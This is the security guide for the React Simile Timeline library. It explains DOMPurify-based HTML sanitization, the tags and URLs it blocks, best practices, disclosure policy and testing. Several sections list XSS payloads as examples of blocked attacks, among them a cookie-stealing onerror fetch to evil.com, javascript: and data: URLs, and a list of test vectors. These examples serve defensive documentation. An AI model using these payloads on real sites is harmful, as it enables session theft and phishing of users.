# Security - React Simile Timeline

**Last Updated**: 2025-11-16
**Version**: v1.0.0
**Security Contact**: See [SECURITY.md](../SECURITY.md) in repo root

---

## Overview

React Simile Timeline takes security seriously. This document explains our security features, best practices, and how to report vulnerabilities.

**Key Security Features**:
- ✅ HTML sanitization with DOMPurify (v1.0+)
- ✅ XSS attack prevention
- ✅ Safe HTML tag whitelist
- ✅ Dangerous URL blocking
- ✅ Event handler stripping
- ✅ No known vulnerabilities in dependencies

---

## HTML Sanitization

### Overview

Starting in v1.0.0, all HTML content in event descriptions is **automatically sanitized** using [DOMPurify](https://github.com/cure53/DOMPurify), the industry-standard HTML sanitizer.

**Purpose**: Prevent Cross-Site Scripting (XSS) attacks from malicious or untrusted event data.

### How It Works

```tsx
import DOMPurify from 'dompurify';

// When rendering event descriptions
const sanitizedHTML = DOMPurify.sanitize(event.description, {
  ALLOWED_TAGS: [...], // Safe tags only
  ALLOWED_ATTR: ['href', 'target', 'rel', 'class', 'id'],
  ALLOW_DATA_ATTR: false,
  ADD_ATTR: [],
});

<div dangerouslySetInnerHTML={{ __html: sanitizedHTML }} />
```

### Configuration

Current DOMPurify configuration (v1.0.0):

```tsx
const sanitizeConfig = {
  // Allowed HTML tags
  ALLOWED_TAGS: [
    // Text formatting
    'b', 'i', 'em', 'strong', 'u', 's', 'sup', 'sub', 'mark',

    // Links
    'a',

    // Structure
    'p', 'br', 'div', 'span', 'hr',

    // Lists
    'ul', 'ol', 'li',

    // Tables
    'table', 'thead', 'tbody', 'tr', 'th', 'td',

    // Headers
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',

    // Code
    'code', 'pre', 'blockquote'
  ],

  // Allowed attributes
  ALLOWED_ATTR: ['href', 'target', 'rel', 'class', 'id'],

  // Disallow data attributes
  ALLOW_DATA_ATTR: false,

  // No additional attributes
  ADD_ATTR: [],

  // Return DOM for better performance
  RETURN_DOM: false,
  RETURN_DOM_FRAGMENT: false,

  // Sanitize in place
  IN_PLACE: false,

  // Force body for proper parsing
  FORCE_BODY: true,

  // Keep HTML comments? No (security)
  KEEP_CONTENT: true,
};
```

---

## Security Guarantees

### What We Block

#### 1. Scripts

All script execution is blocked:

```html
<!-- ❌ BLOCKED -->
<script>alert('XSS')</script>
<script src="evil.js"></script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
```

#### 2. Event Handlers

All inline event handlers are stripped:

```html
<!-- ❌ BLOCKED -->
<div onclick="alert('XSS')">Click me</div>
<input onfocus="stealData()">
<a onmouseover="phishing()">Hover me</a>

<!-- All 70+ event handlers blocked:
onclick, ondblclick, onmousedown, onmouseup, onmouseover, onmousemove,
onmouseout, onmouseenter, onmouseleave, onkeydown, onkeypress, onkeyup,
onload, onerror, onabort, onblur, onchange, onfocus, oninput, onsubmit,
onreset, onselect, onscroll, onwheel, oncontextmenu, ondrag, ondrop,
onanimationstart, onanimationend, ontransitionend, ... -->
```

#### 3. Dangerous URLs

Malicious URL schemes are blocked:

```html
<!-- ❌ BLOCKED -->
<a href="javascript:alert(1)">Click</a>
<a href="data:text/html,<script>alert(1)</script>">Click</a>
<a href="vbscript:msgbox(1)">Click</a>
<iframe src="javascript:alert(1)"></iframe>

<!-- ✅ ALLOWED -->
<a href="https://example.com">Safe link</a>
<a href="http://example.com">Safe link</a>
<a href="mailto:user@example.com">Email</a>
<a href="tel:+1234567890">Phone</a>
<a href="#section">Anchor</a>
<a href="/relative/path">Relative</a>
```

#### 4. Dangerous Tags

Tags that can execute code or load resources:

```html
<!-- ❌ BLOCKED -->
<script>...</script>
<iframe src="..."></iframe>
<object data="..."></object>
<embed src="...">
<applet>...</applet>
<link rel="stylesheet" href="...">
<style>CSS</style>
<base href="...">
<meta http-equiv="refresh">
```

#### 5. Form Elements

Forms blocked to prevent data theft:

```html
<!-- ❌ BLOCKED (use custom components instead) -->
<form action="...">
<input type="text">
<textarea></textarea>
<select><option></option></select>
<button>Click</button>
```

#### 6. Unsafe Attributes

Most attributes are stripped for safety:

```html
<!-- ❌ style attribute BLOCKED -->
<div style="background: url('http://evil.com/track.gif')">Text</div>

<!-- ✅ Safe attributes ALLOWED -->
<div class="my-class" id="my-id">Text</div>
<a href="https://example.com" target="_blank" rel="noopener noreferrer">Link</a>
```

### What We Allow

Safe HTML that can't execute code:

```html
<!-- ✅ All of these are SAFE -->

<!-- Text formatting -->
<p>This is <b>bold</b>, <i>italic</i>, and <em>emphasized</em></p>
<strong>Strong text</strong>
<u>Underlined</u>
<s>Strikethrough</s>
<sup>Superscript</sup>
<sub>Subscript</sub>
<mark>Highlighted</mark>

<!-- Links (safe URLs only) -->
<a href="https://example.com" target="_blank" rel="noopener noreferrer">
  External Link
</a>

<!-- Lists -->
<ul>
  <li>Item 1</li>
  <li>Item 2</li>
</ul>

<ol>
  <li>First</li>
  <li>Second</li>
</ol>

<!-- Tables -->
<table>
  <thead>
    <tr><th>Header</th></tr>
  </thead>
  <tbody>
    <tr><td>Data</td></tr>
  </tbody>
</table>

<!-- Headers -->
<h1>Heading 1</h1>
<h2>Heading 2</h2>
<h3>Heading 3</h3>

<!-- Code -->
<code>inline code</code>
<pre>preformatted text</pre>
<blockquote>Quote</blockquote>

<!-- Structure -->
<div class="container">
  <span class="label">Label:</span>
  <p>Paragraph</p>
  <br>
  <hr>
</div>
```

---

## Security Best Practices

### For Application Developers

#### 1. Validate Event Data Sources

```tsx
// ✅ GOOD: Validate event data before using
import { validateEvent } from 'react-simile-timeline';

const events = rawData.map(event => {
  const validation = validateEvent(event);
  if (!validation.valid) {
    console.error('Invalid event:', validation.errors);
    return null;
  }
  return validation.event;
}).filter(Boolean);
```

#### 2. Use HTTPS for External Resources

```tsx
// ❌ BAD: HTTP can be hijacked
description: '<img src="http://example.com/image.jpg">'

// ✅ GOOD: HTTPS is encrypted
description: '<img src="https://example.com/image.jpg">'
```

#### 3. Set CSP Headers

Add Content Security Policy headers:

```html
<!-- In your HTML -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self' 'unsafe-inline';
               style-src 'self' 'unsafe-inline';
               img-src 'self' https:;">
```

#### 4. Validate User Input

If users can create events:

```tsx
import DOMPurify from 'dompurify';

function createEvent(userInput) {
  return {
    title: DOMPurify.sanitize(userInput.title, { ALLOWED_TAGS: [] }), // Plain text
    description: DOMPurify.sanitize(userInput.description), // HTML allowed
    start: validateDate(userInput.start),
  };
}
```

#### 5. Use Subresource Integrity (SRI)

If loading from CDN:

```html
<script src="https://cdn.example.com/timeline.js"
        integrity="sha384-..."
        crossorigin="anonymous"></script>
```

#### 6. Regular Security Audits

```bash
# Check for vulnerabilities
npm audit

# Fix automatically
npm audit fix

# Check only production dependencies
npm audit --production
```

---

## Common Attack Vectors (Blocked)

### XSS via Event Handlers

```tsx
// ❌ ATTACK ATTEMPT
const maliciousEvent = {
  title: 'Click Me',
  description: '<img src=x onerror="fetch(`https://evil.com?cookie=${document.cookie}`)">'
};

// ✅ SANITIZED OUTPUT
// <img src=x>
// Event handler removed, attack failed ✓
```

### XSS via JavaScript URLs

```tsx
// ❌ ATTACK ATTEMPT
const maliciousEvent = {
  title: 'Phishing',
  description: '<a href="javascript:void(location=\'https://phishing.com?ref=\'+document.referrer)">Win Prize!</a>'
};

// ✅ SANITIZED OUTPUT
// <a>Win Prize!</a>
// JavaScript URL removed, attack failed ✓
```

### XSS via Data URLs

```tsx
// ❌ ATTACK ATTEMPT
const maliciousEvent = {
  description: '<iframe src="data:text/html,<script>alert(document.domain)</script>"></iframe>'
};

// ✅ SANITIZED OUTPUT
// (Empty - iframe completely removed)
// Attack failed ✓
```

### XSS via Style Injection

```tsx
// ❌ ATTACK ATTEMPT
const maliciousEvent = {
  description: '<div style="background: url(\'javascript:alert(1)\')">Text</div>'
};

// ✅ SANITIZED OUTPUT
// <div>Text</div>
// Style attribute removed, attack failed ✓
```

### DOM Clobbering

```tsx
// ❌ ATTACK ATTEMPT
const maliciousEvent = {
  description: '<form name="length"><input name="length"></form>'
};

// ✅ SANITIZED OUTPUT
// (Empty - forms blocked)
// Attack failed ✓
```

---

## Dependency Security

### Current Dependencies

Security-critical dependencies:

```json
{
  "dependencies": {
    "dompurify": "^3.3.0",  // HTML sanitization
    "react": "^18.0.0",      // UI framework
    "react-dom": "^18.0.0",  // DOM renderer
    "date-fns": "^3.0.0",    // Date utilities
    "zustand": "^4.5.0"      // State management
  }
}
```

### Vulnerability Monitoring

We monitor dependencies for vulnerabilities:

- ✅ Automated: Dependabot alerts
- ✅ Manual: Monthly `npm audit` reviews
- ✅ Critical patches: Released within 48 hours
- ✅ High severity: Released within 7 days

### Update Policy

```bash
# Check for vulnerabilities
npm audit

# Current status (v1.0.0)
# 0 vulnerabilities found ✓
```

---

## Reporting Security Vulnerabilities

### Please DO NOT

- ❌ Open public GitHub issues for security bugs
- ❌ Discuss vulnerabilities on social media
- ❌ Share exploit code publicly

### Please DO

1. **Email maintainers privately** (see [SECURITY.md](../SECURITY.md))
2. **Include**:
   - Description of vulnerability
   - Steps to reproduce
   - Proof of concept (if available)
   - Your contact information
   - Disclosure timeline (90 days recommended)

3. **Expect**:
   - Acknowledgment within 48 hours
   - Status updates every 7 days
   - Credit in security advisory (if desired)
   - Coordinated disclosure

### Responsible Disclosure

We follow a **90-day disclosure timeline**:

1. **Day 0**: Vulnerability reported
2. **Day 1-7**: Acknowledgment & impact assessment
3. **Day 7-30**: Develop fix
4. **Day 30-60**: Test fix & prepare release
5. **Day 60-90**: Coordinate public disclosure
6. **Day 90**: Public disclosure & release

---

## Security Advisories

### Published Advisories

**None yet** - v1.0.0 is the first stable release.

Future advisories will be published at:
- GitHub Security Advisories
- npm advisory database
- Release notes on GitHub

### Advisory Format

```
GHSA-XXXX-XXXX-XXXX

Title: [Brief description]
Severity: Critical | High | Medium | Low
Component: [Affected component]
Versions: [Affected versions]
Fixed In: [Version with fix]

Description:
[Detailed description of vulnerability]

Impact:
[What attackers could do]

Mitigation:
[How to fix/workaround]

Credits:
[Researcher who found it]
```

---

## Security Testing

### Our Testing Approach

#### 1. XSS Testing

```tsx
// Test suite includes 50+ XSS vectors
const xssVectors = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '<iframe src="javascript:alert(1)">',
  '<object data="javascript:alert(1)">',
  '<embed src="javascript:alert(1)">',
  '<a href="javascript:alert(1)">click</a>',
  '<form action="javascript:alert(1)"><button>click</button></form>',
  // ... 42 more vectors
];

// All blocked ✓
```

#### 2. Sanitization Testing

```bash
# Run security tests
npm test -- __tests__/EventBubble.sanitization.test.tsx

# All tests pass ✓
```

#### 3. Manual Penetration Testing

- Manual XSS testing with OWASP ZAP
- DOM clobbering attempts
- Protocol handler hijacking
- CSS injection testing

### Your Testing

Test sanitization in your app:

```tsx
import { render } from '@testing-library/react';
import { Timeline } from 'react-simile-timeline';

test('blocks XSS attempts', () => {
  const maliciousEvents = [
    {
      title: 'XSS Test',
      description: '<script>alert("XSS")</script><p>Safe</p>',
      start: '2024-01-01'
    }
  ];

  const { container } = render(<Timeline data={maliciousEvents} />);

  // Script should be removed
  expect(container.innerHTML).not.toContain('<script>');

  // Safe content should remain
  expect(container.innerHTML).toContain('<p>Safe</p>');
});
```

---

## Security Checklist

### For Users

- [ ] Using latest version (v1.0.0+)
- [ ] Event data validated before use
- [ ] External resources loaded over HTTPS
- [ ] CSP headers configured
- [ ] Regular `npm audit` checks
- [ ] Dependencies up to date
- [ ] No console warnings in production

### For Contributors

- [ ] All code reviewed for security issues
- [ ] XSS prevention considered
- [ ] No `dangerouslySetInnerHTML` without sanitization
- [ ] No `eval()` or `Function()` constructors
- [ ] Input validation on all user data
- [ ] Security tests included
- [ ] Documentation updated

---

## Additional Resources

### Documentation

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
- [Content Security Policy Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

### Tools

- [OWASP ZAP](https://www.zaproxy.org/) - Security testing
- [npm audit](https://docs.npmjs.com/cli/v8/commands/npm-audit) - Dependency scanning
- [Snyk](https://snyk.io/) - Vulnerability scanning

---

## Security Compliance

### Standards

- ✅ OWASP Top 10 - XSS Prevention
- ✅ CWE-79 - Cross-site Scripting
- ✅ CWE-80 - Improper Neutralization
- ✅ CSP Level 3 Compatible

### Certifications

Currently pursuing:
- SOC 2 Type II (planned 2026)
- ISO 27001 (planned 2026)

---

## FAQ

**Q: Is sanitization enabled by default?**
A: Yes, always enabled in v1.0+. Cannot be disabled.

**Q: Can I trust event data from my database?**
A: Yes, but sanitize anyway (defense in depth). Databases can be compromised.

**Q: Does sanitization impact performance?**
A: Minimal. DOMPurify is highly optimized. Adds <1ms per event.

**Q: Can I customize allowed tags?**
A: Not currently. Open an issue if you have a use case.

**Q: What if I need to render custom HTML?**
A: Use custom EventBubble components with your own sanitization.

**Q: Is React Simile Timeline GDPR compliant?**
A: Yes, we don't collect any user data. You control all data.

---

**Last Updated**: 2025-11-16
**Version**: 1.0
**Maintained By**: React Simile Timeline Security Team
